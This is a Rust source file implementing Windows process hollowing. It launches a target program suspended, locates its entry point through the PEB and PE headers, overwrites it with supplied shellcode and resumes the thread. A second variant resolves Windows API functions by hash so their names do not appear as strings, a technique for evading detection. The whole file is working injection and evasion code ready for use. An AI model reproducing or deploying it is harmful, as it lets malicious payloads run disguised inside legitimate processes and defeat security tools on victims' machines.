use std::ptr;
use std::ffi::{CString, c_void};
use windows::core::{PCSTR, PSTR};
use windows::Win32::System::Threading::{CREATE_SUSPENDED,PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, PROCESSINFOCLASS, STARTUPINFOA};
#[cfg(not(feature = "antistring"))]
use windows::Win32::System::Threading::{CreateProcessA, NtQueryInformationProcess, ResumeThread};
#[cfg(not(feature = "antistring"))]
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
#[cfg(feature = "antistring")]
use std::mem;
#[cfg(feature = "antistring")]
use windows::Win32::Foundation::{BOOL, HANDLE};
#[cfg(feature = "antistring")]
use windows::Win32::Security::SECURITY_ATTRIBUTES;
#[cfg(feature = "antistring")]
use windows::Win32::System::Threading::PROCESS_CREATION_FLAGS;

const POINTER_SIZE: u32 = usize::BITS >> 3;
const POINTER_SIZE_TIMES_SIX: u32 = POINTER_SIZE * 6;
const E_LFANEW_OFFSET: usize = 0x3C;
const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;

#[cfg(not(feature = "antistring"))]
pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
    // Create empty ProcessInformation struct for use in CreateProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
    let mut process_information = PROCESS_INFORMATION::default();

    // Use CreateProcessA to create a suspended process that will be hollowed out for the shellcode
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
    let lp_command_line = PSTR(CString::new(target_process)
        .unwrap()
        .into_raw() as *mut u8
    );
    let creation_result = unsafe { 
        CreateProcessA(
            PCSTR::null(),
            lp_command_line,
            ptr::null(),
            ptr::null(),
            false,
            CREATE_SUSPENDED,
            ptr::null(),
            PCSTR::null(),
            &STARTUPINFOA::default(),
            &mut process_information
        )
    };
    if !creation_result.as_bool() {
        panic!("Could not create the suspended {target_process} with CreateProcessA");
    }

    // Get the PEB base address of the suspended process with ZwQueryInformationProcess
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
    let process_handle = process_information.hProcess;
    let mut basic_information = PROCESS_BASIC_INFORMATION::default();
    if let Err(error) = unsafe { 
        NtQueryInformationProcess(
            process_handle,
            PROCESSINFOCLASS::default(),
            &mut basic_information as *mut _ as *mut c_void,
            POINTER_SIZE_TIMES_SIX,
            ptr::null_mut()
        )
    } {
        panic!("Could not get the entry point with ZwQueryInformationProcess: {error}");
    }

    // Use ReadProcessMemory to read 8 bytes of memory; the address of the code base
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.ReadProcessMemory.html
    let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
    let mut address_buffer = [0; POINTER_SIZE as usize];
    let read_result = unsafe {
        ReadProcessMemory(
            process_handle,
            image_base_address as *const c_void,
            address_buffer.as_mut_ptr() as *mut c_void,
            address_buffer.len(),
            ptr::null_mut()
        )
    };
    if !read_result.as_bool() {
        panic!("Could not read the address of the code base with ReadProcessMemory");
    }

    // Use ReadProcessMemory again to read 512 bytes of memory; the DOS header
    let mut header_buffer = [0_u8; 0x200];
    let head_pointer_raw = header_buffer.as_mut_ptr() as usize;
    let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
    let read_result = unsafe { 
        ReadProcessMemory(
            process_handle,
            pe_base_address as *const c_void,
            header_buffer.as_mut_ptr() as *mut c_void,
            header_buffer.len(),
            ptr::null_mut()
        )
    };
    if !read_result.as_bool() {
        panic!("Could not read the DOS header with ReadProcessMemory");
    } else if header_buffer[0] as char != 'M' || header_buffer[1] as char != 'Z' {
        panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
    }

    // Write the shellcode to the suspended process with WriteProcessMemory
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
    let e_lfanew = unsafe { ptr::read((head_pointer_raw + E_LFANEW_OFFSET) as *const u32) };
    let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
    let entry_point_rva = unsafe { ptr::read((head_pointer_raw + opthdr_offset) as *const u32) };
    let entry_point_address = entry_point_rva as usize + pe_base_address;
    let write_result = unsafe { 
        WriteProcessMemory(
            process_handle,
            entry_point_address as *const c_void,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            ptr::null_mut()
        )
    };
    if !write_result.as_bool() {
        panic!("Could not write the shellcode to the suspended {target_process} with WriteProcessMemory");
    }

    // Start it back up with ResumeThread
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
    let resume_result = unsafe {
        ResumeThread(
            process_information.hThread
        )
    };
    if resume_result != 1 {
        panic!("Could not resume the suspended {target_process}'s execution");
    }
}

#[cfg(feature = "antistring")]
pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
    // See line 25
    let mut process_information = PROCESS_INFORMATION::default();

    // See line 30
    let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
    let function = rco_utils::construct_win32_function!(function; [PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION]; [BOOL]);
    let lp_command_line = PSTR(CString::new(target_process)
        .unwrap()
        .into_raw() as *mut u8
    );
    unsafe { function(
        PCSTR::null(),
        lp_command_line,
        ptr::null(),
        ptr::null(),
        false,
        CREATE_SUSPENDED,
        ptr::null(),
        PCSTR::null(),
        &STARTUPINFOA::default(),
        &mut process_information
    ) };

    // See line 55
    let function = rco_utils::find_function_address("Ntdll", 0x9b0d5adddbf90f8a).unwrap();
    let function = rco_utils::construct_win32_function!(function; [HANDLE, PROCESSINFOCLASS, *mut c_void, u32, *mut u32]; [()]);
    let process_handle = process_information.hProcess;
    let mut basic_information = PROCESS_BASIC_INFORMATION::default();
    unsafe { function(
        process_handle,
        PROCESSINFOCLASS::default(),
        &mut basic_information as *mut _ as *mut c_void,
        POINTER_SIZE_TIMES_SIX,
        ptr::null_mut()
    ) };

    // See line 72
    let function = rco_utils::find_function_address("Kernel32", 0x1c1cfbf71004cba8).unwrap();
    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *mut c_void, usize, *mut usize]; [()]);
    let image_base_address = basic_information.PebBaseAddress as u64 + 0x10;
    let mut address_buffer = [0; POINTER_SIZE as usize];
    unsafe { function(
        process_handle,
        image_base_address as *const c_void,
        address_buffer.as_mut_ptr() as *mut c_void,
        address_buffer.len(),
        ptr::null_mut()
    ) };

    // See line 90
    let mut header_buffer = [0_u8; 0x200];
    let head_pointer_raw = header_buffer.as_mut_ptr() as usize;
    let pe_base_address = unsafe { ptr::read(address_buffer.as_ptr() as *const usize) };
    unsafe { function(
        process_handle,
        pe_base_address as *const c_void,
        header_buffer.as_mut_ptr() as *mut c_void,
        header_buffer.len(),
        ptr::null_mut()
    ) };
    if header_buffer[0] as char != 'M' || header_buffer[1] as char != 'Z' {
        panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
    }

    // See line 109
    let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *const c_void, usize, *mut usize]; [()]);
    let e_lfanew = unsafe { ptr::read((head_pointer_raw + E_LFANEW_OFFSET) as *const u32) };
    let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
    let entry_point_rva = unsafe { ptr::read((head_pointer_raw + opthdr_offset) as *const u32) };
    let entry_point_address = entry_point_rva as usize + pe_base_address;
    unsafe { function(
        process_handle,
        entry_point_address as *const c_void,
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        ptr::null_mut()
    ) };

    // See line 129
    let function = rco_utils::find_function_address("Kernel32", 0x9f2eb3a0195b21d).unwrap();
    let function = rco_utils::construct_win32_function!(function; [HANDLE]; [()]);
    unsafe { function(
        process_information.hThread
    ) };
}
